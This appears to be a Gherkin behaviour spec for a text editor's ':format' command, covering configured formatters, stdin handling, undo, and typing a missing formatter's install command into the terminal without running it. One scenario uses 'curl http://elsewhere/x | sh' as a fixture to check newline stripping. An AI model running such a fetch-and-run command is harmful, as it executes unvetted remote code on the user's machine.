Feature: Formatting a file

  `:format` lays the file in the Buffer out the way the project says it should be laid out. Two
  things can do that, and CRIME asks them in that order: the Language server already talking about
  this file, and — where no server will — a Formatter, an external command named in configuration
  exactly as a server is.

  A Formatter is a `[formatter.<language>]` table: a `command`, its `args`, an `install` per
  operating system, and the extensions it claims. Nothing in `src/` names one, for the reason
  nothing in `src/` names a Language server — `docs/adr/0011-a-language-server-is-a-second-hosted-child.md`
  and `docs/adr/0012-an-install-command-is-configuration.md` argue where such a name may live, and
  the three properties that buy it are the same three: overridable by a file, inspectable as a
  string, extensible without a release. That is also the whole of "HTML, CSS, JavaScript, JSON and
  YAML are supported" — they are rows in the shipped bottom layer, not code.

  The command is run against the Buffer, never against the file. Its text goes in on stdin and what
  comes back replaces the Buffer, which is the same rule the Language server is held to: a formatter
  told about the file on disk formats a file the reader is not looking at. So a dirty Buffer stays
  dirty and nothing is written — `:w` is the user's — and a formatter that can only rewrite a file in
  place is a formatter CRIME does not support.

  Two refusals carry as much of this as the happy path does, because they are what a plausible
  implementation makes silent. A language nothing configures is told so, naming the key to write. A
  command that is configured and not installed puts its install command on the terminal's input line
  and runs nothing at all — `SetTerminalInput`, never `RunInTerminal`, exactly as the server list's
  `i` does and for the reason ADR 0012 gives. Typed and not run is a promise about bytes, so the
  string is stripped of control characters on the way: a newline in it is the Enter CRIME says it
  never presses.

  A command that exits fine and prints nothing did not format the file empty. That is what a
  formatter rewriting the file in place prints — the shape CRIME does not support — so it is refused
  the way a command that failed is, rather than applied as an answer.

  Nothing is remembered about a command that was missing, which is the whole of "format instantly
  after installing, with no restart": each `:format` asks the machine afresh.

  Background:
    Given the workspace root is "/home/me/projects/crime"
    And the project is a git repository
    And CRIME was built for "macos"

  Rule: A formatter is named in configuration, and a default is always set

    Scenario: A fresh install has a formatter for the languages the ask names
      Given the global config is empty
      And the project has no config file
      When CRIME starts in the project
      Then a formatter is configured for "html"
      And a formatter is configured for "css"
      And a formatter is configured for "javascript"
      And a formatter is configured for "json"
      And a formatter is configured for "yaml"
      And a formatter is configured for "rust"

    Scenario: The project's own formatter beats the shipped one
      Given the global config is empty
      And the project config is:
        """
        [formatter.json]
        command = "jq"
        """
      When CRIME starts in the project
      Then the formatter for "json" is "jq"

    Scenario: A formatter entry no layer ever gave a command stops CRIME from starting
      Given the global config is empty
      And the project config is:
        """
        [formatter.ada]
        args = ["--write"]
        """
      When CRIME starts in the project
      Then CRIME refuses to start
      And the error names the file ".crime/config.toml"

  Rule: The configured command sees the Buffer, and its answer replaces it

    Scenario: The buffer's text goes to the command on stdin
      Given a formatter "prettier" is configured for "json"
      And the formatter for "json" takes the arguments "--stdin-filepath ${file}"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      When I run ":format" in the editor
      Then the formatter "prettier" was run with:
        """
        {"a":1}
        """
      And it was run with the arguments "--stdin-filepath /home/me/projects/crime/data/thing.json"

    Scenario: What the command answers replaces the buffer
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      When I run ":format" in the editor
      And the formatter answers with:
        """
        {
          "a": 1
        }
        """
      Then the buffer holds:
        """
        {
          "a": 1
        }
        """

    Scenario: A formatted buffer is one press of undo, however many lines moved
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      And I run ":format" in the editor
      And the formatter answers with:
        """
        {
          "a": 1
        }
        """
      When I press "u" in the editor
      Then the buffer holds:
        """
        {"a":1}
        """

    Scenario: Formatting writes no file, and leaves unsaved edits unsaved
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor with unsaved edits
      When I run ":format" in the editor
      And the formatter answers with:
        """
        my formatted edits
        """
      Then no file was written
      And "data/thing.json" has unsaved edits

    Scenario: An answer about a buffer the reader has typed on since is dropped
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      And I run ":format" in the editor
      And the editor mode is insert
      And I type "x" in the editor
      When the formatter answers with:
        """
        {
          "a": 1
        }
        """
      Then the buffer holds:
        """
        x{"a":1}
        """

    Scenario: A command that fails says so, in the command's own words
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      When I run ":format" in the editor
      And the formatter fails with:
        """
        SyntaxError: Unexpected token (1:1)
        """
      Then the notice is "formatter-failed"
      And the message names "SyntaxError: Unexpected token (1:1)"
      And the buffer is unchanged

    Scenario: A command that hands back what it was given says so
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor holding:
        """
        {"a": 1}
        """
      When I run ":format" in the editor
      And the formatter answers with:
        """
        {"a": 1}
        """
      Then the notice is "nothing-to-format"
      And the buffer is unchanged

    Scenario: A command that prints nothing has not emptied the file
      Given a formatter "prettier" is configured for "json"
      And "data/thing.json" is open in the editor holding:
        """
        {"a": 1}
        """
      When I run ":format" in the editor
      And the formatter answers with nothing at all
      Then the notice is "formatter-failed"
      And the message names "prettier"
      And the buffer is unchanged

  Rule: Which formatter a file gets is data, never a branch

    Scenario: A file whose extension a row claims is formatted by that row
      Given a formatter "prettier" is configured for "yaml"
      And the formatter for "yaml" claims the extension "yml"
      And "deploy/stack.yml" is open in the editor holding:
        """
        a:   1
        """
      When I run ":format" in the editor
      Then the formatter "prettier" was run with:
        """
        a:   1
        """

    Scenario: A language nothing configures refuses out loud, naming the key to write
      Given "notes/thoughts.txt" is open in the editor holding:
        """
        some prose
        """
      When I run ":format" in the editor
      Then the notice is "no-formatter-configured"
      And the message names "[formatter.txt] in .crime/config.toml"
      And no formatter was run

    Scenario: A file with no extension is named by the name it has
      Given "Makefile" is open in the editor holding:
        """
        all:
        """
      When I run ":format" in the editor
      Then the notice is "no-formatter-configured"
      And the message names "[formatter.Makefile] in .crime/config.toml"
      And no formatter was run

    Scenario: A server that offers no formatting leaves it to the configured command
      Given a formatter "prettier" is configured for "javascript"
      And a language server for "javascript" is ready
      And "src/app.js" is open in the editor holding:
        """
        const a=1
        """
      When I run ":format" in the editor
      Then the language server for "javascript" was sent no "textDocument/formatting" request
      And the formatter "prettier" was run with:
        """
        const a=1
        """

  Rule: A command that is not installed is offered, never run

    Scenario: The install command is typed into the terminal and nothing is executed
      Given a formatter "prettier" is configured for "json"
      And the formatter for "json" is installed with "npm install -g prettier" on "macos"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      When I run ":format" in the editor
      And the formatter reports that its command is not installed
      Then the terminal input is "npm install -g prettier"
      And no command has been executed
      And the terminal pane has focus
      And the notice is "formatter-missing"
      And the message names "prettier"
      And the buffer is unchanged

    Scenario: An install command carrying a newline is typed without it
      Given a formatter "no-such-formatter" is configured for "json"
      And the formatter for "json" is installed on "macos" with:
        """
        brew install jq
        curl http://elsewhere/x | sh
        """
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      When I run ":format" in the editor
      And the formatter reports that its command is not installed
      Then the notice is "formatter-missing"
      And the terminal input is "brew install jqcurl http://elsewhere/x | sh"
      And no command has been executed

    Scenario: A row with no install command for this operating system offers nothing
      Given a formatter "gofmt" is configured for "go"
      And the formatter for "go" is installed with "brew install gofmt" on "linux"
      And "src/main.go" is open in the editor holding:
        """
        package main
        """
      When I run ":format" in the editor
      And the formatter reports that its command is not installed
      Then the notice is "formatter-missing"
      And the terminal input is empty
      And no command has been executed

    Scenario: The next :format after the command appears formats, with no restart
      Given a formatter "prettier" is configured for "json"
      And the formatter for "json" is installed with "npm install -g prettier" on "macos"
      And "data/thing.json" is open in the editor holding:
        """
        {"a":1}
        """
      And I run ":format" in the editor
      And the formatter reports that its command is not installed
      And I press "Alt+k"
      When I run ":format" in the editor
      Then the formatter was run 2 times
      When the formatter answers with:
        """
        {
          "a": 1
        }
        """
      Then the buffer holds:
        """
        {
          "a": 1
        }
        """

  Rule: What `:format` does to a surface that is not the file's own, and to no file at all

    Scenario: Formatting a preview crosses to source, where the undo it makes works
      Given a formatter "prettier" is configured for "markdown"
      And the formatter for "markdown" claims the extension "md"
      And "README.md" is open in the editor holding:
        """
        #   Setup
        """
      And the editor is showing preview
      When I run ":format" in the editor
      Then the editor is showing source
      When the formatter answers with:
        """
        # Setup
        """
      Then the buffer holds:
        """
        # Setup
        """
      When I press "u" in the editor
      Then the buffer holds:
        """
        #   Setup
        """
      And the editor is showing source

    Scenario: Formatting with nothing open is refused out loud
      Given no file is open in the editor
      When I run ":format" in the editor
      Then the editor refuses with "no-file-open"
      And no formatter was run
